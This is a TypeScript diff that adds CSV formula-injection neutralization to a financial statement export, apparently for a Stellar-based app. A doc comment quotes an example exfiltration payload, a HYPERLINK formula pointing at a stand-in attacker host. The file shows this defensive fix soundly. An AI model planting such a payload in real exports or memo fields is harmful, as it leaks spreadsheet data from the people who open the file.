@@ -84,11 +84,41 @@ function buildStatementRowsUrl(filters: StatementExportFilters, cursor?: string)
   return url.toString();
 }
 
-function escapeCsvCell(value: string): string {
-  if (/[,"\n\r]/.test(value)) {
-    return `"${value.replace(/"/g, '""')}"`;
+/**
+ * Characters that make a spreadsheet evaluate a cell as a formula instead of
+ * text. Tab and carriage return are included because Excel strips leading
+ * whitespace before deciding, so "\t=cmd" still evaluates as a formula.
+ */
+const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
+/** Plain numeric cells (negatives included) are data, never formulas. */
+const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
+
+/**
+ * Neutralize CSV formula injection (CWE-1236).
+ *
+ * `counterparty` and `memoOrReference` are attacker-influenceable — any Stellar
+ * counterparty can set an arbitrary memo — so a memo such as
+ * `=HYPERLINK("http://evil.com?"&A1)` would otherwise execute when the exported
+ * statement is opened in Excel or Google Sheets. Prefixing with a single quote
+ * makes the spreadsheet render the original text without evaluating it.
+ *
+ * Genuinely numeric cells are left untouched so negative amounts keep sorting
+ * and summing as numbers.
+ */
+export function neutralizeCsvFormula(value: string): string {
+  if (PLAIN_NUMBER.test(value)) {
+    return value;
   }
-  return value;
+  return CSV_FORMULA_PREFIX.test(value) ? `'${value}` : value;
+}
+
+function escapeCsvCell(value: string): string {
+  const safe = neutralizeCsvFormula(value);
+  if (/[,"\n\r]/.test(safe)) {
+    return `"${safe.replace(/"/g, '""')}"`;
+  }
+  return safe;
 }
 
 export function toStatementCsv(rows: StatementRow[]): string {
